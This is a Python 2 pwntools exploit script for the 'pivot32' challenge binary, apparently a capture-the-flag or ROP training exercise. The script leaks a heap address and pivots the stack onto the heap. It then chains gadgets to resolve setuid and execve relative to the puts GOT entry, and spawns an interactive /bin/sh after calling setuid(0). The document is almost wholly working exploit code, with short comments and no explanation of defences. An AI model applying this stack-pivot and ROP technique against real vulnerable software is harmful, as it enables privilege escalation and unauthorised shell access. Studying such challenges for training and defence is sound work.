# Credit to ompamo
#!/usr/bin/env python2
from pwn import *

p = process("./pivot32")
# useful address (adjust offsets according to your LIBC version)
puts_got = p32(0x804a01c)
execve_off = p32(0x56cc0) # 0xbde20(execve_plt)-0x67160(puts_plt)
setuid_off = p32(0x57530) # 0xbe690(execve_plt)-0x67160(puts_plt)

# gadgets
xchg_eax_esp = p32(0x080488c2)
pop_eax = p32(0x080488c0)
pop_ebx = p32(0x08048946)
mov_eax_dleax = p32(0x080488c4)
add_eax_ebx = p32(0x080488c7)
jmp_eax = p32(0x08048a5f)

def rop_ret2execve(got_address, offset, next_rop, p1, p2, p3):
    payload = ''
    payload += pop_eax + got_address + mov_eax_dleax  # eax has puts plt
    payload += pop_ebx + offset + add_eax_ebx         # eax has execve plt
    payload += jmp_eax + next_rop + p32(p1) + p32(p2) + p32(p3)
    return payload

def rop_ret2setuid(got_address, offset, next_rop, p1):
    payload = ''
    payload += pop_eax + got_address + mov_eax_dleax   # eax has puts plt
    payload += pop_ebx + offset + add_eax_ebx          # eax has setuid plt
    payload += jmp_eax + next_rop + p32(p1)
    return payload

# Get heap address
leak_addr = p.recvline_contains("The Old Gods").strip().rsplit(' ', 1)[1]
log.info("Leaked heap address is at: " + str(leak_addr))
heap_addr = u32(unhex(leak_addr[2:]), endian='big')

shell_command = "/bin/sh\x00"
# Stage one: pivot stack to heap address
pay1 = "A"*44
pay1 += pop_eax
pay1 += p32(heap_addr + len(shell_command))
pay1 += xchg_eax_esp


# Stage two: call "setuid" and "execve"
pay2 = shell_command
# Execute setuid. To return clean we need to call "pop eax; ret"
pay2 += rop_ret2setuid(puts_got, setuid_off, pop_eax, 0x0)
pay2 += rop_ret2execve(puts_got, execve_off, pop_eax, heap_addr, 0x0, 0x0)

p.sendline(pay2)
p.sendline(pay1)
p.interactive()

